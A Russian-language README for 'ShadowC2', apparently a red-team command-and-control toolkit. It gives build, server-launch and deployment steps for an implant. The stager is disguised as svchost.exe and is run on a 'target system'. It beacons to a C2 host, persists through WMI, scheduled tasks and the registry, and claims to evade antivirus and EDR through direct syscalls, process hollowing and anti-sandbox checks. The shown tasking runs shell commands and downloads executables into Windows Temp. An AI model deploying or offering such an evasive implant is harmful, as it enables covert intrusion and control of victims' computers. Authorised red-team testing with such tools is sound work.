# ShadowC2 Toolkit

**Advanced Command & Control Solution for Red Teams**

![Version](https://img.shields.io/badge/version-1.0-blue.svg)
![Platform](https://img.shields.io/badge/platform-Windows-lightgrey.svg)
![Python](https://img.shields.io/badge/python-3.7+-blue.svg)
![C++](https://img.shields.io/badge/C++-17-blue.svg)

## Описание

ShadowC2 - это продвинутый toolkit для создания недетектируемых C2 (Command & Control) решений. Разработан для использования в тестировании проникновения и red team операциях.

### Особенности

- ✅ **Максимальная скрытность** - Обход современных AV/EDR решений
- ✅ **Многоуровневая архитектура** - Stager, Loader, Beacon компоненты
- ✅ **Direct System Calls** - Обход user-mode hooks через NTDLL
- ✅ **Living Off The Land** - Использование легитимных системных инструментов
- ✅ **Advanced Evasion** - Anti-VM, Anti-Sandbox, Process Hollowing
- ✅ **Multiple Persistence** - WMI Events, Scheduled Tasks, Registry
- ✅ **Encrypted Communications** - TLS 1.3 + Application Level Encryption
- ✅ **Web-Based C2** - Современный веб-интерфейс управления
- ✅ **Cross-Platform Server** - Работает на Linux, Windows, macOS

## Быстрый старт

### 1. Установка зависимостей

```bash
# Debian/Ubuntu
sudo apt-get update
sudo apt-get install -y cmake gcc g++ python3 python3-pip openssl libssl-dev upx-ucl

# Установка Python зависимостей
cd server
pip3 install -r requirements.txt
```

### 2. Сборка toolkit

```bash
# Полная сборка
python3 scripts/build.py

# Сборка только стейджера
python3 scripts/build.py --stager-only
```

### 3. Запуск сервера

```bash
# Генерация SSL сертификатов
cd server
openssl req -x509 -newkey rsa:4096 -keyout server.key -out server.crt -days 365 -nodes

# Запуск сервера
python3 scripts/run_server.py --host 0.0.0.0 --port 8443
```

### 4. Развертывание агента

```bash
# На целевой системе запустите стейджер
bin/svchost.exe

# Или используйте полный агент с параметрами
bin/shadowc2.exe --beacon --persist
```

### 5. Управление

Откройте браузер и перейдите по адресу:
```
https://your-server:8443
```

## Архитектура

### Компоненты

```
ShadowC2 Toolkit
├── src/                    # Исходный код C++
│   ├── stager.cpp         # Мини-загрузчик
│   ├── loader.cpp         # Лоадер с обходом AV/EDR
│   ├── beacon.cpp         # Основной агент
│   ├── persistence.cpp    # Механизмы персистентности
│   └── main.cpp          # Точка входа
├── server/                # C2 сервер на Python
│   ├── shadow_server.py   # Основной сервер
│   └── requirements.txt   # Python зависимости
├── scripts/               # Скрипты сборки и запуска
│   ├── build.py          # Скрипт сборки
│   └── run_server.py     # Скрипт запуска сервера
├── bin/                   # Скомпилированные файлы
└── docs/                  # Документация
```

### Методы обхода защиты

1. **Direct System Calls**
   - Обход user-mode hooks в NTDLL
   - Использование SysWhispers3 техник
   - Dynamic syscall resolution

2. **Process Hollowing**
   - Выполнение в контексте svchost.exe
   - Маскировка под легитимный процесс
   - Стабильная работа

3. **DLL Injection**
   - Инъекция в explorer.exe
   - Использование доверенных процессов
   - Трудно обнаружить

4. **Anti-Analysis**
   - Обнаружение VM (VMware, VirtualBox)
   - Обнаружение sandbox
   - Anti-debugging техники

5. **Living Off The Land**
   - PowerShell для выполнения
   - WMI для персистентности
   - CertUtil для загрузки

## Команды

### Shell Commands
```json
{
  "type": "shell",
  "data": {
    "command": "whoami /all"
  }
}
```

### File Operations
```json
{
  "type": "download",
  "data": {
    "url": "https://example.com/file.exe",
    "path": "C:\\Windows\\Temp\\file.exe"
  }
}
```

### Persistence
```json
{
  "type": "persist",
  "data": {
    "method": "wmi"
  }
}
```

## Конфигурация

### Сервер

```json
{
  "server": {
    "host": "your-server.com",
    "port": 443,
    "use_ssl": true
  },
  "beacon": {
    "interval": 30,
    "jitter": 25,
    "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
  }
}
```

### Агент

```cpp
// В shadow.h
#define C2_HOST L"your-server.com"
#define C2_PORT 443
#define BEACON_INTERVAL 30000
#define JITTER_PERCENT 25
```

## Примеры использования

### Базовое развертывание

```bash
# 1. Сборка
python3 scripts/build.py

# 2. Запуск сервера
python3 scripts/run_server.py --host 0.0.0.0 --port 8443

# 3. Развертывание на целевой системе
# Копируем bin/svchost.exe на целевую систему и запускаем
```

### Расширенное использование

```bash
# Агент с персистентностью и конкретным методом выполнения
shadowc2.exe --beacon --persist --method direct

# Сервер в режиме отладки
python3 scripts/run_server.py --debug --host 127.0.0.1
```

### API использование

```python
import requests

# Отправка команды
response = requests.post('https://server:8443/api/commands?beacon_id=ID', 
    json={
        'type': 'shell',
        'data': {'command': 'whoami'}
    })

# Получение результатов
result = requests.get('https://server:8443/api/commands?beacon_id=ID')
```

## Безопасность

### Шифрование

- TLS 1.3 для всех соединений
- Дополнительное шифрование на уровне приложения
- Ротация ключей

### Обфускация

- Полиморфный код
- Случайные имена переменных
- Anti-disassembly техники

### Эвакуация

- Jitter для маскировки трафика
- Легитимные User-Agent строки
- Маскировка под HTTPS трафик

## Требования

### Системные требования

- **Операционная система**: Windows 7+ (агент), Linux/Windows/macOS (сервер)
- **Python**: 3.7+
- **Компилятор**: GCC 7+ или MSVC 2017+
- **Память**: 512MB RAM
- **Диск**: 100MB свободного места

### Зависимости

- CMake 3.10+
- OpenSSL
- Python aiohttp
- Python cryptography

## Отладка

### Включение режима отладки

```bash
# Сервер
python3 scripts/run_server.py --debug

# Агент
shadowc2.exe --debug
```

### Просмотр логов

```bash
tail -f shadowc2.log
```

### Проверка соединения

```bash
curl -k https://your-server:8443/beacon
```

## Устранение неполадок

### Сервер не запускается

1. Проверьте SSL сертификаты
2. Убедитесь, что порт не занят
3. Проверьте права на директории

### Beacon не подключается

1. Проверьте сетевое соединение
2. Убедитесь в правильности конфигурации
3. Проверьте брандмауэр

### Команды не выполняются

1. Проверьте права пользователя
2. Убедитесь, что команда корректна
3. Проверьте логи сервера

## Лицензия

Этот toolkit создан в образовательных целях для тестирования безопасности. Используйте только на системах, где у вас есть разрешение.

## Отказ от ответственности

Авторы не несут ответственности за любой ущерб, вызванный использованием этого toolkit. Пользователи несут полную ответственность за свои действия.

## Вклад в проект

Pull requests приветствуются. Для крупных изменений, пожалуйста, создайте issue для обсуждения.

## Контакты

Для вопросов и предложений создайте issue в репозитории проекта.

---

**Внимание**: Этот инструмент предназначен только для легального тестирования безопасности и исследований. Использование без разрешения владельца системы является незаконным.